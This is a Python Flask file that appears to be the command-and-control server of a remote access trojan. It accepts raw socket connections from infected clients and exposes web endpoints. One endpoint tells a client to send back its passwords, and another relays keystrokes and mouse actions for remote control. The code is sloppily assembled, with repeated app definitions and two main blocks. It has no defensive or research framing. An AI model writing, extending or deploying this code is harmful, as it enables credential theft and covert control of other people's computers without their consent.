from flask import Flask, render_template, request, jsonify
import threading
import socket
import json
import time
import os
import subprocess

app = Flask(__name__)

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')  # Make sure index.html is inside the 'templates' folder

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)


# Store connected clients
clients = {}
client_lock = threading.Lock()

def start_server_socket():
    HOST = '0.0.0.0'
    PORT = 5784
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        print(f"[*] Listening on {HOST}:{PORT}")
        while True:
            conn, addr = s.accept()
            with client_lock:
                client_id = f"client_{len(clients) + 1}"
                clients[client_id] = {"conn": conn, "addr": addr}
            print(f"[+] {client_id} connected from {addr}")

# Password retrieval endpoint
@app.route('/api/get_passwords', methods=['POST'])
def get_passwords():
    client_id = request.json.get("client_id")
    if client_id not in clients:
        return jsonify({"error": "Client not found"}), 404
    
    try:
        clients[client_id]["conn"].sendall(b"GET_PASSWORDS")
        passwords = clients[client_id]["conn"].recv(8192).decode()
        return jsonify({"passwords": passwords})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Remote control endpoint
@app.route('/api/send_input', methods=['POST'])
def send_input():
    client_id = request.json.get("client_id")
    key = request.json.get("key")
    action = request.json.get("action")  # 'keypress', 'mouse_move', 'mouse_click'
    
    if client_id not in clients:
        return jsonify({"error": "Client not found"}), 404
    
    try:
        clients[client_id]["conn"].sendall(f"{action}:{key}".encode())
        return jsonify({"status": "Input sent"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    threading.Thread(target=start_server_socket, daemon=True).start()
    app.run(host='0.0.0.0', port=5000)
    
app = Flask(__name__)
 
app = Flask(__name__)
